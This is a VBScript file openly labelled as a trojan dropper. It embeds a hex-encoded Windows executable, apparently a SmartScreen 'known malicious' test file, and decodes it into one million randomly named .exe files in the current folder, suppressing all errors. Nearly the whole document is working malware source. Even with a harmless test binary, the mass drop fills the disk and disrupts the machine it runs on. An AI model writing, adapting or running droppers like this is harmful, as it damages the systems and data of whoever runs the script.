'Trojan.VBS.Inor.MSTestDropper.A
'By tsukisuperior
'Drops 1000000 copys of this https://demo.smartscreen.msft.net/download/known/knownmalicious.exe
On Error Resume Next
Randomize
Dim hexstring, name, strLetters

'All this does is decode this string and write it to 1000000 times to files with random names 
hexstring = "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c01020026d72c4c0000000000000000e00002010b010800000400000002000000000000ce2200000020000000400000000040000020000000020000040000000000000004000000000000000060000000020000000000000300408500001000001000000000100000100000000000001000000000000000000000007822000053000000000000000000000000000000000000000000000000000000004000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000d4020000002000000004000000020000000000000000000000000000200000602e72656c6f6300000c000000004000000002000000060000000000000000000000000000400000420000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b02200000000000048000000020005007c200000fc0100000100000001000006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000133001000b000000010000117201000070280100000a2a0013300200070000000100001102280200000a2a0042534a4201000100000000000c00000076342e302e33303331390000000005006c000000c0000000237e00002c0100005800000023537472696e677300000000840100004c00000023555300d0010000100000002347554944000000e00100001c00000023426c6f620000000000000002000010470402000900000000fa25330016000001000000020000000200000002000000020000000100000001000000010000000000460001000000000006001b0022000600290022000000000001000000000001000100000000000a000000050001000100502000000000100031000a000100682000000000061836000e00010011003c001200090036000e0017000480000000000000000000000000000000004600000004000000000000000000000001001200000000000000003c4d6f64756c653e0050726f6772616d006d73636f726c6962004f626a6563740053797374656d00436f6e736f6c65004d61696e002e63746f720057726974654c696e65004b6e6f776e4d616c6963696f7573000000000049660039006400640063006300390038002d0063003000390033002d0034006600360034002d0039006600650065002d003300660033003800640031003000340035006600620037000100b33bf1b2fda9224490dd33bf9126e9d70008b77a5c561934e0890300000103200001040001010e0207000000a02200000000000000000000be220000002000000000000000000000000000000000000000000000b022000000000000000000000000000000005f436f724578654d61696e006d73636f7265652e646c6c0000000000ff2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000d03200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
For i = 1 To 1000000
	makecom hexstring, 2
Next
Sub makecom(strSource, lSize)
    strLetters = "abcdef0123456789"
	name = CStr(Rnd() * Rnd())
	strSource = Replace(strSource, " ", "")
    With CreateObject("Scripting.FileSystemObject").CreateTextFile(".\" & name & ".exe", True)
        For lp = 1 To Len(strSource) Step lSize
            .Write Chr(CByte("&H" & Mid(strSource, lp, lSize)))
        Next
    End With
End Sub 


